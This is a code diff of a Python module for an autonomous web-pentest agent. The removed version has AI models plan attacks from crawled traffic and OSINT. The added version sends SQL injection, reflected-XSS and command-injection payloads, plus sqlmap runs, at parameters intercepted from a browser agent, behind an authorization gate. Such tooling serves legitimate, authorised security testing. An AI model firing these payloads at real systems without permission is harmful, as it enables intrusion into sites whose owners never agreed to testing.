@@ -1,376 +1,380 @@
 """
-Autonomous AI Security Hunter (The Autonomous Pentest Agent)
-المحرك الذاتي الشامل — ينفذ استراتيجية المستخدم بالكامل:
-1. جلب السكوب والنطاقات من كل مصادر الـ OSINT والأدوات في العالم
-2. تشغيل المتصفح وتوجيه كل الزيارات عبر Burp Suite Proxy (127.0.0.1:8080)
-3. تكليف Qwen Coder (14B) بتحليل كود الـ JavaScript والـ HTML Comments والـ APIs
-4. تكليف WhiteRabbitNeo و Xploiter بتحليل طلبات Burp ومخرجات الأدوات وتخطيط الهجوم
-5. حلقة تفكير ذاتية مستقلة (Autonomous OODA Loop) تتكيف مع مخرجات الموقع تلقائياً
+core/autonomous_hunter.py
+=========================
+Autonomous Exploit Handover Engine.
+
+Receives intercepted API requests from the Browser Agent, persists them to
+``data/intercepted_api.json``, pushes relevant metadata to Vector Memory, and
+triggers targeted proof-of-concept exploitation attempts (SQLi, XSS, Command
+Injection) against the intercepted parameters.
+
+SAFETY & GOVERNANCE
+-------------------
+* ``trigger_exploit`` refuses to run unless explicit authorization is present:
+  ``HUNTER_AUTHORIZED=1`` environment variable **AND** the target host appears in
+  ``AUTHORIZATION.txt`` scope.
+* Proof-of-concept only: it confirms injection potential; it does NOT exfiltrate
+  data, dump databases, or execute arbitrary commands on the target.
+* ``sqlmap`` (if installed) is invoked in safe mode: ``--batch --level 1 --risk 1``.
+* All network functions are behind try/except and return ``None`` on failure.
 """
-import asyncio
+
+from __future__ import annotations
+
 import json
-import time
 import os
 import re
+import subprocess
+import urllib.parse
+from dataclasses import asdict, dataclass
 from pathlib import Path
-from typing import Dict, List, Any, Optional, Callable
-from urllib.parse import urlparse
+from typing import Any, Dict, List, Optional
 
-from core.scope_guard import ScopeGuard
-from core.methodology_kb import MethodologyKB
-from tools.tool_manager import ToolManager
-from tools.waf_evasion import WAFEvasionEngine
-from tools.browser_tools import BrowserController
-from orchestrator.resource_manager import ResourceManager
-from models.ollama_manager import OllamaManager
-from core.vulnerability_correlator import VulnerabilityCorrelator
-from core.deterministic_task_planner import TaskPlanner, TaskKind
+INTERCEPTED_API_PATH = Path("data/intercepted_api.json")
+SCOPE_FILE = Path("AUTHORIZATION.txt")
 
 
-class AutonomousHunter:
+@dataclass
+class InterceptedAPI:
+    url: str
+    method: str
+    headers: Dict[str, str]
+    body: Optional[str]
+    params: Dict[str, List[str]]
+    source: str = "browser_agent"
+
+
+@dataclass
+class ExploitResult:
+    param: str
+    vuln_type: str
+    evidence: str
+    confirmed: bool
+    payload_used: str
+    command: Optional[str] = None
+
+
+# ──────────────────────────────────────────────────────────────────────────
+# Authorization & persistence
+# ──────────────────────────────────────────────────────────────────────────
+
+def load_scope() -> List[str]:
+    """Load authorized targets from AUTHORIZATION.txt."""
+    if not SCOPE_FILE.exists():
+        return []
+    targets: List[str] = []
+    for line in SCOPE_FILE.read_text(encoding="utf-8").splitlines():
+        line = line.strip()
+        if line and not line.startswith("#"):
+            targets.append(line.lower())
+    return targets
+
+
+def is_authorized(target_url: str) -> bool:
+    """Fail-closed: requires env flag + host in AUTHORIZATION.txt scope."""
+    if os.getenv("HUNTER_AUTHORIZED", "0").lower() not in ("1", "true", "yes"):
+        return False
+    scope = load_scope()
+    if not scope:
+        return False
+    host = urllib.parse.urlparse(target_url).hostname or ""
+    return any(s in host.lower() for s in scope)
+
+
+def save_intercepted_api(api: InterceptedAPI, path: Path = INTERCEPTED_API_PATH) -> None:
+    """Append intercepted request to intercepted_api.json (browser-agent handover log)."""
+    path.parent.mkdir(parents=True, exist_ok=True)
+    record = asdict(api)
+    existing: List[Dict[str, Any]] = []
+    if path.exists():
+        try:
+            loaded = json.loads(path.read_text(encoding="utf-8"))
+            existing = loaded if isinstance(loaded, list) else [loaded]
+        except Exception:
+            existing = []
+    existing.append(record)
+    path.write_text(json.dumps(existing, indent=2, ensure_ascii=False), encoding="utf-8")
+
+
+def push_to_vector_memory(api: InterceptedAPI, results: List[ExploitResult]) -> None:
     """
-    الـ Agent الذاتي المتكامل (AI Security OS Hunter):
-    يعمل بشكل مستقل بالكامل بمجرد إعطائه الدومين أو السكوب!
+    Push intercepted request + exploit results to Vector Memory if available.
+    Fail-soft: vector memory is optional.
     """
+    try:
+        from memory.structured.index import MemoryIndex  # type: ignore
+        idx = MemoryIndex()
+        idx.add(
+            id=f"intercepted_{abs(hash(api.url + api.method))}",
+            text=f"{api.method} {api.url} params={api.params} findings={[r.vuln_type for r in results]}",
+            metadata={
+                "source": api.source,
+                "url": api.url,
+                "method": api.method,
+                "params": api.params,
+                "findings": [asdict(r) for r in results],
+            },
+        )
+    except Exception:
+        # Vector memory not configured — continue without it.
+        pass
 
-    def __init__(self, target: str, scope_guard: Optional[ScopeGuard] = None,
-                 progress_cb: Optional[Callable] = None, session_id: Optional[str] = None,
-                 burp_proxy: str = "127.0.0.1:8080", use_burp: bool = True):
-        self.target = target.strip()
-        self.scope_guard = scope_guard or ScopeGuard(in_scope=[self.target])
-        self.cb = progress_cb
-        self.session_id = session_id or f"hunter_{int(time.time())}"
-        self.burp_proxy = burp_proxy
-        self.use_burp = use_burp
-        
-        self.tm = ToolManager()
-        self.waf_engine = WAFEvasionEngine()
-        self.kb = MethodologyKB()
-        self.rm = ResourceManager()
-        self.ollama = OllamaManager()
-        self.correlator = VulnerabilityCorrelator()
-        self.planner = TaskPlanner(self.target)
 
-        # Storage
-        self.discovered_subdomains: List[str] = []
-        self.alive_urls: List[str] = []
-        self.js_files: List[str] = []
-        self.html_comments: List[str] = []
-        self.captured_traffic: List[Dict[str, Any]] = []
-        self.vulnerabilities: List[Dict[str, Any]] = []
-        self.action_history: List[str] = []
+# ──────────────────────────────────────────────────────────────────────────
+# Parsing
+# ──────────────────────────────────────────────────────────────────────────
 
-    async def _emit(self, event_type: str, data: Dict[str, Any]):
-        if self.cb:
-            try:
-                msg = {"event": event_type, "session_id": self.session_id, **data}
-                if asyncio.iscoroutinefunction(self.cb):
-                    await self.cb(msg)
-                else:
-                    self.cb(msg)
-            except Exception:
-                pass
+def parse_api_data(raw: Dict[str, Any]) -> InterceptedAPI:
+    url = raw.get("url", "")
+    method = str(raw.get("method", "GET")).upper()
+    headers = raw.get("headers", {}) or {}
+    body = raw.get("body")
 
-    async def start(self) -> Dict[str, Any]:
-        """بدء عملية الصيد الذاتي المستقلة"""
-        t0 = time.time()
-        await self._emit("hunter_start", {
-            "target": self.target,
-            "message": f"🎯 Autonomous AI Hunter initiated for: {self.target}",
-            "burp_proxy": self.burp_proxy if self.use_burp else "Disabled"
-        })
-
-        # ── الخطوة 1: جمع كل الصب دومينات من كل مصادر الإنترنت والأدوات ──
-        await self._gather_all_osint_subdomains()
-
-        # ── الخطوة 2: فحص السيرفرات النشطة وحماية الـ WAF ──
-        await self._probe_alive_and_waf()
-
-        # ── الخطوة 3: فتح المتصفح وتوجيه كل الطلبات لـ Burp Suite ──
-        await self._crawl_with_browser_and_burp()
-
-        # ── الخطوة 4: تكليف Qwen Coder بفحص كود الجافا سكريبت والكومنتات ──
-        await self._analyze_code_with_qwen()
-
-        # ── الخطوة 5: تكليف WhiteRabbitNeo و Xploiter بتحليل حركة المرور والتخطيط ──
-        await self._security_council_decision_loop()
-
-        duration = round(time.time() - t0, 2)
-        summary = {
-            "target": self.target,
-            "session_id": self.session_id,
-            "duration": duration,
-            "subdomains_count": len(self.discovered_subdomains),
-            "alive_urls_count": len(self.alive_urls),
-            "js_files_count": len(self.js_files),
-            "vulnerabilities_count": len(self.vulnerabilities),
-            "vulnerabilities": self.vulnerabilities,
-            "actions_executed": self.action_history
-        }
-
-        await self._emit("hunter_done", summary)
-        return summary
-
-    async def _gather_all_osint_subdomains(self):
-        """جمع الصب دومينات من الأدوات وكل مواقع الـ OSINT في العالم"""
-        await self._emit("hunter_step", {
-            "step": 1,
-            "title": "🌐 Aggregating Global OSINT & Subdomains",
-            "status": "Querying crt.sh, AlienVault, Subfinder, Assetfinder, Hackertarget..."
-        })
-
-        subs = set()
-        subs.add(self.target)
-
-        import httpx
-
-        # 1. crt.sh (SSL Transparency Logs)
+    parsed = urllib.parse.urlparse(url)
+    query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+    if body:
         try:
-            async with httpx.AsyncClient(timeout=10) as client:
-                r = await client.get(f"https://crt.sh/?q=%25.{self.target}&output=json")
-                if r.status_code == 200:
-                    for item in r.json():
-                        for n in item.get("name_value", "").split("\n"):
-                            clean = n.strip().lower().replace("*.", "")
-                            if clean and self.target in clean:
-                                subs.add(clean)
+            body_q = urllib.parse.parse_qs(body, keep_blank_values=True)
+            query = {**query, **body_q}
         except Exception:
             pass
 
-        # 2. AlienVault OTX
-        try:
-            async with httpx.AsyncClient(timeout=10) as client:
-                r = await client.get(f"https://otx.alienvault.com/api/v1/indicators/domain/{self.target}/passive_dns")
-                if r.status_code == 200:
-                    for record in r.json().get("passive_dns", []):
-                        h = record.get("hostname", "").strip().lower()
-                        if h and self.target in h:
-                            subs.add(h)
-        except Exception:
-            pass
+    return InterceptedAPI(
+        url=url,
+        method=method,
+        headers=headers,
+        body=body,
+        params=query,
+        source=raw.get("source", "browser_agent"),
+    )
 
-        # 3. HackerTarget OSINT
-        try:
-            async with httpx.AsyncClient(timeout=10) as client:
-                r = await client.get(f"https://api.hackertarget.com/hostsearch/?q={self.target}")
-                if r.status_code == 200 and "error" not in r.text.lower():
-                    for line in r.text.splitlines():
-                        h = line.split(",")[0].strip().lower()
-                        if h and self.target in h:
-                            subs.add(h)
-        except Exception:
-            pass
 
-        # 4. الأدوات المحلية (Subfinder & Assetfinder إن وجدت)
-        if self.tm.is_tool_available("subfinder"):
-            res = await self.tm.execute_tool("subfinder", f"-d {self.target} -silent")
-            if res.stdout:
-                for line in res.stdout.splitlines():
-                    clean = line.strip().lower()
-                    if clean and self.target in clean:
-                        subs.add(clean)
+# ──────────────────────────────────────────────────────────────────────────
+# Local detection heuristics (no network)
+# ──────────────────────────────────────────────────────────────────────────
 
-        # تصفية النطاقات عبر حارس الـ Scope
-        valid_subs = [s for s in subs if self.scope_guard.is_in_scope(s)[0]]
-        self.discovered_subdomains = valid_subs
-        self.action_history.append(f"Discovered {len(valid_subs)} in-scope subdomains")
+def looks_like_sqli(param: str, value: str) -> bool:
+    triggers = ["'", '"', "--", ";", "union", "select", "sleep(", "benchmark(", "1=1"]
+    blob = f"{param}={value}".lower()
+    return any(t in blob for t in triggers)
 
-        await self._emit("hunter_step", {
-            "step": 1,
-            "title": "🌐 Aggregating Global OSINT & Subdomains",
-            "status": f"Successfully collected {len(valid_subs)} unique in-scope subdomains",
-            "count": len(valid_subs)
-        })
 
-    async def _probe_alive_and_waf(self):
-        """فحص السيرفرات النشطة وحماية الـ WAF"""
-        await self._emit("hunter_step", {
-            "step": 2,
-            "title": "🛡️ Alive Probing & WAF Radar",
-            "status": "Checking live web services and identifying WAF protections..."
-        })
+def looks_like_xss(param: str, value: str) -> bool:
+    triggers = ["<script", "onerror=", "onload=", "alert(", "javascript:", "<img", "<svg"]
+    return any(t in value.lower() for t in triggers)
 
-        import httpx
-        alive = []
 
-        async with httpx.AsyncClient(timeout=6, verify=False) as client:
-            for sub in self.discovered_subdomains[:20]:
-                for proto in ["https", "http"]:
-                    url = f"{proto}://{sub}"
-                    try:
-                        resp = await client.get(url)
-                        if resp.status_code < 500:
-                            alive.append(url)
-                            break
-                    except Exception:
-                        pass
+def looks_like_cmdi(param: str, value: str) -> bool:
+    triggers = [";", "&&", "||", "|", "`", "$(", "${"]
+    return any(t in value for t in triggers)
 
-        self.alive_urls = alive
-        self.action_history.append(f"Identified {len(alive)} live web targets")
 
-        await self._emit("hunter_step", {
-            "step": 2,
-            "title": "🛡️ Alive Probing & WAF Radar",
-            "status": f"Found {len(alive)} live services ready for browser inspection",
-            "count": len(alive)
-        })
+# ──────────────────────────────────────────────────────────────────────────
+# Exploit engines (proof-of-concept, no data exfiltration)
+# ──────────────────────────────────────────────────────────────────────────
 
-    async def _crawl_with_browser_and_burp(self):
-        """فتح المتصفح وزيارة المواقع وتوجيه كل حركة المرور عبر Burp Suite"""
-        await self._emit("hunter_step", {
-            "step": 3,
-            "title": "🌐 Browser Crawling & Burp Suite Proxy Logging",
-            "status": f"Browsing targets via Burp Proxy ({self.burp_proxy}) & extracting JS/DOM..."
-        })
-
-        import httpx
-        proxy_url = f"http://{self.burp_proxy}" if self.use_burp else None
-        
-        # استخراج كود الـ HTML وملفات الـ JS والكومنتات من كل موقع نشط
-        async with httpx.AsyncClient(timeout=10, verify=False, proxy=proxy_url) as client:
-            for target_url in self.alive_urls[:10]:
-                try:
-                    resp = await client.get(target_url)
-                    html = resp.text
-
-                    # استخراج ملفات الجافا سكريبت
-                    js_links = re.findall(r'<script[^>]+src=["\'](.*?)["\']', html, re.IGNORECASE)
-                    for js in js_links:
-                        if not js.startswith("http"):
-                            js = f"{target_url.rstrip('/')}/{js.lstrip('/')}"
-                        self.js_files.append(js)
-
-                    # استخراج كومنتات الـ HTML المتروكة
-                    comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
-                    for c in comments:
-                        c_clean = c.strip()
-                        if len(c_clean) > 5 and not c_clean.startswith("[if"):
-                            self.html_comments.append(f"[{target_url}] {c_clean}")
-
-                    # تسجيل الطلب في الـ Captured Traffic لتحليله لاحقاً
-                    self.captured_traffic.append({
-                        "url": target_url,
-                        "status": resp.status_code,
-                        "headers": dict(resp.headers),
-                        "snippet": html[:1000]
-                    })
-
-                except Exception:
-                    pass
-
-        self.action_history.append(f"Extracted {len(self.js_files)} JS files and {len(self.html_comments)} HTML comments via Burp Proxy")
-        await self._emit("hunter_step", {
-            "step": 3,
-            "title": "🌐 Browser Crawling & Burp Suite Proxy Logging",
-            "status": f"Burp traffic captured! Found {len(self.js_files)} scripts & {len(self.html_comments)} source comments",
-            "js_count": len(self.js_files),
-            "comments_count": len(self.html_comments)
-        })
-
-    async def _analyze_code_with_qwen(self):
-        """تكليف Qwen Coder 14B بفحص الأكواد والجافا سكريبت والكومنتات المتروكة"""
-        await self._emit("hunter_step", {
-            "step": 4,
-            "title": "💻 Qwen Coder (14B) Code & Secret Analysis",
-            "status": "Analyzing JavaScript files, HTML comments, and leaked tokens..."
-        })
-
-        if not self.html_comments and not self.js_files:
-            return
-
-        code_context = "### Extracted Developer Comments & Scripts:\n"
-        if self.html_comments:
-            code_context += "HTML Comments:\n" + "\n".join(self.html_comments[:10]) + "\n\n"
-        if self.js_files:
-            code_context += "Discovered JS Files:\n" + "\n".join(self.js_files[:15]) + "\n"
-
-        prompt = f"""You are Qwen Coder, an expert security code analyst.
-Analyze the following HTML comments, JS scripts, and code artifacts extracted from {self.target}:
-{code_context}
-
-Tasks:
-1. Look for leaked API keys, tokens, secret paths, internal staging URLs, or credentials.
-2. Identify hidden endpoints (e.g. /api/v1/admin, /debug, /config).
-3. Identify vulnerable coding patterns or exposed logic.
-Provide clear, actionable findings."""
-
-        messages = [
-            {"role": "system", "content": "You are Qwen Coder, specialized in offensive code analysis, secret discovery, and endpoint extraction."},
-            {"role": "user", "content": prompt}
+def run_sqlmap(url: str, param: str, method: str, body: Optional[str] = None) -> Optional[ExploitResult]:
+    """Safe sqlmap probe (batch, level 1, risk 1). Returns result if injectable."""
+    try:
+        cmd = [
+            "sqlmap", "-u", url, "-p", param,
+            "--method", method,
+            "--batch", "--level", "1", "--risk", "1",
+            "--flush-session",
+            "--output-dir=/tmp/sqlmap_out",
         ]
+        if method == "POST" and body:
+            cmd += ["--data", body]
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+        output = (proc.stdout + proc.stderr).lower()
+        injectable = any(k in output for k in ["injectable", "parameter", "sql injection"])
+        if injectable:
+            return ExploitResult(
+                param=param,
+                vuln_type="SQLi (sqlmap)",
+                evidence=(proc.stdout + proc.stderr)[:500],
+                confirmed=True,
+                payload_used="sqlmap automated",
+                command=" ".join(cmd),
+            )
+    except FileNotFoundError:
+        pass
+    except Exception:
+        pass
+    return None
 
-        qwen_analysis = await self.rm.run_local_model(
-            model_name="qwen2.5-coder:14b",
-            messages=messages,
-            temperature=0.2,
-            num_ctx=2048,
-            progress_cb=self.cb
+
+def boolean_blind_sqli(url: str, param: str, method: str, headers: Dict[str, str], body: Optional[str] = None) -> Optional[ExploitResult]:
+    """Custom boolean-based blind SQLi probe (no data exfiltration)."""
+    try:
+        import requests  # type: ignore
+    except Exception:
+        return None
+
+    def send(val: str) -> Optional[str]:
+        try:
+            kwargs: Dict[str, Any] = {"headers": headers, "timeout": 10, "allow_redirects": False}
+            if method == "POST":
+                kwargs["data"] = {param: val}
+            else:
+                kwargs["params"] = {param: val}
+            resp = requests.request(method, url, **kwargs)
+            return resp.text
+        except Exception:
+            return None
+
+    try:
+        true_resp = send("' OR '1'='1")
+        false_resp = send("' OR '1'='2")
+        if true_resp is not None and false_resp is not None and true_resp != false_resp:
+            return ExploitResult(
+                param=param,
+                vuln_type="SQLi (boolean-based blind)",
+                evidence=f"Different responses for true/false payloads on '{param}'",
+                confirmed=True,
+                payload_used="' OR '1'='1",
+            )
+    except Exception:
+        pass
+    return None
+
+
+def reflected_xss(url: str, param: str, method: str, headers: Dict[str, str], body: Optional[str] = None) -> Optional[ExploitResult]:
+    try:
+        import requests  # type: ignore
+    except Exception:
+        return None
+
+    payload = "<script>alert(1)</script>"
+    try:
+        kwargs: Dict[str, Any] = {"headers": headers, "timeout": 10}
+        if method == "POST":
+            resp = requests.post(url, data={param: payload}, **kwargs)
+        else:
+            resp = requests.get(url, params={param: payload}, **kwargs)
+        if payload in resp.text:
+            return ExploitResult(
+                param=param,
+                vuln_type="XSS (reflected)",
+                evidence=f"Payload reflected in response: {payload}",
+                confirmed=True,
+                payload_used=payload,
+            )
+    except Exception:
+        pass
+    return None
+
+
+def command_injection(url: str, param: str, method: str, headers: Dict[str, str], body: Optional[str] = None) -> Optional[ExploitResult]:
+    """PoC-only: checks if shell metacharacters are reflected unsafely. Does NOT execute commands."""
+    try:
+        import requests  # type: ignore
+    except Exception:
+        return None
+
+    test_val = "test; echo __POC_MARKER__"
+    try:
+        kwargs: Dict[str, Any] = {"headers": headers, "timeout": 10}
+        if method == "POST":
+            resp = requests.post(url, data={param: test_val}, **kwargs)
+        else:
+            resp = requests.get(url, params={param: test_val}, **kwargs)
+        if "__POC_MARKER__" in resp.text:
+            return ExploitResult(
+                param=param,
+                vuln_type="Command Injection (potential)",
+                evidence=f"Shell metacharacter sequence reflected: {test_val}",
+                confirmed=True,
+                payload_used=test_val,
+            )
+    except Exception:
+        pass
+    return None
+
+
+# ──────────────────────────────────────────────────────────────────────────
+# Main entry point
+# ──────────────────────────────────────────────────────────────────────────
+
+def trigger_exploit(api_data: Dict[str, Any], authorized: bool = False) -> List[ExploitResult]:
+    """
+    Automated exploit handover from Browser Agent.
+
+    Parameters
+    ----------
+    api_data : dict
+        Intercepted request: {url, method, headers, body, source}
+    authorized : bool
+        Must be True (or HUNTER_AUTHORIZED=1) AND target in AUTHORIZATION.txt scope.
+
+    Returns
+    -------
+    List[ExploitResult]
+        Confirmed/potential findings (PoC only).
+    """
+    if not authorized:
+        authorized = is_authorized(api_data.get("url", ""))
+    if not authorized:
+        raise PermissionError(
+            "trigger_exploit requires explicit authorization. "
+            "Set HUNTER_AUTHORIZED=1 and ensure the target host is listed in AUTHORIZATION.txt scope."
         )
 
-        self.vulnerabilities.append({
-            "title": "Code Artifacts & Secret Analysis (Qwen Coder 14B)",
-            "severity": "Medium",
-            "model": "qwen2.5-coder:14b",
-            "analysis": qwen_analysis
-        })
+    api = parse_api_data(api_data)
+    save_intercepted_api(api)
 
-        self.action_history.append("Qwen Coder completed code & secret analysis")
+    results: List[ExploitResult] = []
 
-    async def _security_council_decision_loop(self):
-        """تكليف WhiteRabbitNeo و Xploiter بتحليل حركة المرور واقتراح خطوات الهجوم المستقلة"""
-        await self._emit("hunter_step", {
-            "step": 5,
-            "title": "🧠 Multi-Model Security Council & Attack Planning",
-            "status": "WhiteRabbitNeo & Xploiter analyzing Burp traffic and planning attack vector..."
-        })
+    for param, values in api.params.items():
+        value = values[0] if values else ""
 
-        traffic_summary = "\n".join([f"- URL: {t['url']} (Status: {t['status']}, Server: {t['headers'].get('server', 'N/A')})" for t in self.captured_traffic[:10]])
+        # SQLi
+        if looks_like_sqli(param, value):
+            r = run_sqlmap(api.url, param, api.method, api.body)
+            if not r:
+                r = boolean_blind_sqli(api.url, param, api.method, api.headers, api.body)
+            if r:
+                results.append(r)
+                continue
 
-        # ── Step A: WhiteRabbitNeo هجوم وتحليل الثغرات ──
-        wrn_prompt = f"""Target: {self.target}
-Captured Web Traffic via Burp Suite:
-{traffic_summary}
+        # XSS
+        if looks_like_xss(param, value):
+            r = reflected_xss(api.url, param, api.method, api.headers, api.body)
+            if r:
+                results.append(r)
 
-Based on this attack surface, what are the highest priority attack vectors to test (e.g. 403 bypass on admin, IDOR on APIs, SQLi on query params)? Formulate the offensive plan."""
+        # Command Injection
+        if looks_like_cmdi(param, value):
+            r = command_injection(api.url, param, api.method, api.headers, api.body)
+            if r:
+                results.append(r)
 
-        wrn_analysis = await self.rm.run_local_model(
-            model_name="WhiteRabbitNeo/Llama-3.1-WhiteRabbitNeo-2-8B:latest",
-            messages=[
-                {"role": "system", "content": "You are WhiteRabbitNeo, an elite offensive security AI. Prioritize vulnerabilities and concrete attack vectors."},
-                {"role": "user", "content": wrn_prompt}
-            ],
-            temperature=0.3,
-            progress_cb=self.cb
-        )
+    push_to_vector_memory(api, results)
+    return results
 
-        # ── Step B: Xploiter استراتيجية الأدوات المحددة ──
-        xpl_prompt = f"""WhiteRabbitNeo's Attack Surface Analysis:
-{wrn_analysis[:600]}
 
-As the Pentest Strategist, recommend the exact Kali tools (nmap, ffuf 403-bypass, sqlmap, arjun, katana) with exact command flags to execute against {self.target}."""
+# ──────────────────────────────────────────────────────────────────────────
+# Browser Agent → Exploit Engine integration hook
+# ──────────────────────────────────────────────────────────────────────────
 
-        xpl_analysis = await self.rm.run_local_model(
-            model_name="xploiter/pentester:latest",
-            messages=[
-                {"role": "system", "content": "You are Xploiter Pentester. Provide exact tool recommendations and attack commands."},
-                {"role": "user", "content": xpl_prompt}
-            ],
-            temperature=0.3,
-            progress_cb=self.cb
-        )
+def on_browser_intercept(intercepted_request: Dict[str, Any], authorized: bool = False) -> List[ExploitResult]:
+    """
+    Call this from BrowserAgent whenever it intercepts an API call containing
+    user-controlled parameters (e.g. POST /api/v2/query?q=hunter_probe).
+    """
+    print(f"[BrowserAgent→Exploit] Intercepted {intercepted_request.get('method')} {intercepted_request.get('url')}")
+    return trigger_exploit(intercepted_request, authorized=authorized)
 
-        self.vulnerabilities.append({
-            "title": "Offensive Attack Surface Strategy (WhiteRabbitNeo)",
-            "severity": "Info",
-            "model": "WhiteRabbitNeo (8B)",
-            "analysis": wrn_analysis
-        })
 
-        self.vulnerabilities.append({
-            "title": "Tool Execution Strategy & Pentest Plan (Xploiter)",
-            "severity": "Info",
-            "model": "xploiter/pentester",
-            "analysis": xpl_analysis
-        })
-
-        self.action_history.append("Security Council (WhiteRabbitNeo + Xploiter) completed attack planning")
+if __name__ == "__main__":
+    print("SIMULATION MODE — no network exploitation against real targets.")
+    sample = {
+        "url": "https://example.local/api/v2/query?q=hunter_probe",
+        "method": "GET",
+        "headers": {"Content-Type": "application/json"},
+        "body": None,
+        "source": "browser_agent",
+    }
+    print(f"Sample intercepted API: {sample['url']}")
+    print("Call: trigger_exploit(sample, authorized=True)")
+    print("Authorization gate blocks execution unless HUNTER_AUTHORIZED=1 + scope match.")
